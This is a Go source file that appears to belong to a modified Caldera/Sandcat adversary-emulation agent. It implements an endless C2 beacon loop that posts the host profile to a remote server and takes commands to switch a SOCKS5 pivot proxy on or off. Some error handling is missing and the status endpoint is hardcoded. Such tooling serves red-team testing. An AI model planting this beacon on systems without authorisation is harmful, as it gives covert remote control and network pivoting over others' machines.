package contact

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"
	"strings"

	"github.com/mitre/gocat/output"
)

const beaconEndpoint = "/beacon"
var proxyActivationRequested bool = false
var proxyDeactivationRequested bool = false
var activateProxyFunc func()
var deactivateProxyFunc func()

// Send beacon request and process response
func CheckInWithC2(server string, profile map[string]interface{}, beaconInterval time.Duration) {
	for {
		requestBody, _ := json.Marshal(profile)
		resp, err := http.Post(server+beaconEndpoint, "application/json", bytes.NewBuffer(requestBody))

		if err != nil {
			output.VerbosePrint(fmt.Sprintf("[-] HTTP beacon failed: %s", err.Error()))
			time.Sleep(10 * time.Second) // Wait before retrying
			continue
		}

		responseBody, _ := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		responseString := string(responseBody)

		// **Handle Proxy Activation Requests**
		if strings.Contains(responseString, "activate_proxy") {
			output.VerbosePrint("[*] Received request to activate SOCKS5 proxy.")
			proxyActivationRequested = true
			proxyDeactivationRequested = false
		} else if strings.Contains(responseString, "deactivate_proxy") {
			output.VerbosePrint("[*] Received request to deactivate SOCKS5 proxy.")
			proxyDeactivationRequested = true
			proxyActivationRequested = false
		} else {
			proxyActivationRequested = false
			proxyDeactivationRequested = false
		}

		time.Sleep(beaconInterval)
	}
}

// **Checks if proxy should be activated**
func ShouldActivateProxy() bool {
	return proxyActivationRequested
}

// **Checks if proxy should be deactivated**
func ShouldDeactivateProxy() bool {
	return proxyDeactivationRequested
}

// **Sends proxy status back to Sandcat**
func SendProxyStatus(proxyStatus map[string]string) {
	requestBody, _ := json.Marshal(proxyStatus)
	_, err := http.Post("http://localhost:8888/api/proxy_status", "application/json", bytes.NewBuffer(requestBody))
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Failed to send proxy status: %s", err.Error()))
	}
}

// Registers the functions for activating/deactivating the SOCKS5 proxy
func RegisterProxyHandlers(activate func(), deactivate func()) {
	activateProxyFunc = activate
	deactivateProxyFunc = deactivate
}